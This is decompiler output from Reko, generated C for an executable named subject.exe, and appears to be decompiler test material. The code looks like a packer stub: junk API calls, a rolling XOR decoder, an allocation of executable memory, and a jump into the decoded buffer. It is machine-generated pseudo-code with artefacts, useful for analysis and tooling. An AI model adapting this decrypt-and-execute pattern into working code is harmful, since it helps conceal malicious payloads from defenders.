// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 1310D000: void fn1310D000(Stack (ptr32 byte) dwArg04, Stack ptr32 dwArg08, Stack word32 dwArg0C, Stack (ptr32 word32) dwArg10, Stack ui32 dwArg14, Stack Eq_7 dwArg18)
void fn1310D000(byte * dwArg04, ptr32 dwArg08, word32 dwArg0C, word32 * dwArg10, ui32 dwArg14, Eq_7 dwArg18)
{
	*dwArg10 = dwArg0C;
	CreateFileA(null, 0x00, 0x00, null, 0x00, 0x00, null);
	SleepEx(0x00, 0x00);
	union Eq_35 * dwArg08_170 = dwArg08 + dwArg14;
	do
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			return;
		ui32 ebx_139 = DPB(dwLoc1D, (byte) *dwArg08_170, 0) ^ *((word32) dwArg18.u0 + (word32) wLoc1C) & 0xFF;
		*dwArg04 = (byte) ebx_139;
		wLoc1C = (word16) ((word32) SLICE(ebx_139, word16, 8) + 0x01);
		dwLoc1D = ebx_139;
		if ((int32) wLoc1C == 0x05)
			wLoc1C = 0x00;
		byte * ecx_162 = dwArg04 + 0x01;
		if (ecx_162 == (byte *) 0x29)
			return;
		union Eq_35 * ebx_169 = (char *) dwArg08_170 + 0x01;
		dwArg04 = ecx_162;
		dwArg08_170 = ebx_169;
	} while (ebx_169 != (union Eq_35 *) 0xBE000000);
}

// 1310D0E5: void fn1310D0E5(Register word32 ebp)
void fn1310D0E5(word32 ebp)
{
	ContinueDebugEvent(0x00, 0x00, 0x00);
	GetLastError();
	LookupPrivilegeValueA(null, null, fp - 0x02C4);
	ptr32 esp_193 = fp - 0x02D8;
	if (false)
	{
		Eq_31 eax_294 = WriteProfileSectionW(null, null);
		word32 v13_302 = eax_294 + 0xFFF5 ^ ((eax_294 ^ 0x13101FF6) ^ 0x01);
		word32 esi_307 = v13_302->dw0000;
		fn1310D000(fp - 0x023C, fp - 0x023C, 0x04, fp - 0x10, fp - 0x0234 ^ fp - 0x0234, fp - 0x0234);
		word32 v17_353 = Mem0[v13_302 + 0x04:word32] + (WaitForSingleObject(fp - 0x10 ^ fp - 0x10, 0x54000000) + 0x01);
		fn1310D000(fp - 600, fp - 0x025C, 0x04, fp - 0x10, 0x04, fp - 0x0234);
		ui32 edi_365 = v13_302->dw0008;
		fn1310D000(fp - 0x14, fp - 0x1C, 0x04, fp - 0x10, 0x08, fp - 0x0234);
		word32 ecx_396 = v13_302->dw000C;
		fn1310D000(fp - 0x1C, fp - 0x28, 0x04, fp - 0x10, 0x0C, fp - 0x0234);
		CreateFileW(null, 0x00, 0x00, null, 0x00, 0x00, tLoc02D8);
		dwLoc0248 = v13_302->t0010;
		fn1310D000(fp - 0x0248, fp - 600, 0x04, fp - 0x10, 0x10, fp - 0x0234);
		WritePrivateProfileStringA(null, (CHAR *) 0x38000000, null, null);
		Eq_223 ebx_471 = edi_365 * 0x08 + 0x0C;
		dwLoc023C = esi_307;
		dwLoc0258 = v17_353;
		dwLoc14 = edi_365;
		dwLoc024C = 0x14;
		dwLoc24 = (word32 *) ((char *) &v13_302->t0010 + 0x04);
		dwLoc2C = ebx_471;
		esp_193 = fp - 0x02D4;
		dwLoc0260 = VirtualAlloc(eax_294 - 0x01, ebx_471 + v17_353 + esi_307, 0x3000, 0x40);
		dwLoc0C = (char *) ebx_471 + (ecx_396 + 0x13100000);
		dwLoc0264 = ebx_471;
		dwLoc08 = 0x00;
		dwLoc18 = null;
	}
	while (0x01 != 0x00)
	{
		LPCSTR * esp_173 = esp_193 - 0x04;
		*esp_173 = (LPCSTR *) null;
		*(esp_173 - 0x04) = 0x00;
		*(esp_173 - 0x08) = 0x00;
		WritePrivateProfileSectionA(*(esp_173 - 0x08), *(esp_173 - 0x04), *esp_173);
		if (dwLoc0264 == dwLoc0248)
		{
			ui32 ecx_213 = dwLoc08 + 0x01;
			dwLoc08 = ecx_213;
			if (ecx_213 == dwLoc14)
				break;
			word32 ebx_219 = *dwLoc24;
			*esp_173 = (LPCSTR *) (fp - 0x0234);
			*(esp_173 - 0x04) = dwLoc024C;
			*(esp_173 - 0x08) = fp - 0x10;
			*(esp_173 - 0x0C) = 0x04;
			*(esp_173 - 0x10) = fp - 0x1C - dwLoc024C;
			*(esp_173 - 0x14) = fp - 0x1C;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			LPVOID * eax_248 = dwLoc24 + 0x01;
			dwLoc0248 = (Eq_223) *eax_248;
			*esp_173 = (LPCSTR *) (fp - 0x0234);
			ui32 esi_245 = dwLoc024C + 0x04;
			*(esp_173 - 0x04) = esi_245;
			*(esp_173 - 0x08) = fp - 0x10;
			*(esp_173 - 0x0C) = 0x04;
			*(esp_173 - 0x10) = fp - 0x0248 - esi_245;
			*(esp_173 - 0x14) = fp - 0x0248;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			dwLoc024C = esi_245 + 0x04;
			dwLoc24 = (word32 *) ((char *) eax_248 + 0x04);
			dwLoc0264 = null;
			dwLoc0C = ebx_219 + 0x13100000;
		}
		Mem198[dwLoc0260 + dwLoc18:byte] = Mem178[dwLoc0C + 0x00:byte];
		dwLoc0C = dwLoc0C + 0x01;
		dwLoc18 = dwLoc18 + 0x01;
		dwLoc0264 = (Eq_223) ((char *) dwLoc0264 + 0x01);
	}
	ptr32 * esp_104 = esp_193 - 0x04;
	*esp_104 = fp - 0x0234;
	*(esp_104 - 0x04) = (LPVOID *) dwLoc2C;
	*(esp_104 - 0x08) = fp - 0x0238;
	*(esp_104 - 0x0C) = (LPVOID *) dwLoc0258;
	*(esp_104 - 0x10) = (LPVOID *) (dwLoc0260 - dwLoc2C);
	*(esp_104 - 0x14) = (union Eq_266 *) dwLoc0260;
	fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*esp_104 = fp;
	*(esp_104 - 0x04) = fp - 0x0234;
	*(esp_104 - 0x08) = (LPVOID *) dwLoc0258;
	*(esp_104 - 0x0C) = dwLoc023C;
	*(esp_104 - 0x10) = (union Eq_266 *) dwLoc0260;
	word32 ecx_151 = dwLoc0260 + dwLoc0258;
	*(esp_104 - 0x14) = (LPVOID *) ecx_151;
	ptr32 esp_155;
	word32 ebp_156;
	byte SCZO_157;
	word32 eax_158;
	word32 esi_159;
	byte SZO_160;
	bool C_161;
	bool Z_162;
	word32 ecx_163;
	word32 edi_164;
	word32 ebx_165;
	byte dl_166;
	(dwLoc0260 + 5056)();
	*(esp_155 - 0x04) = 0x00;
	ExitProcess(*(esp_155 - 0x04));
}

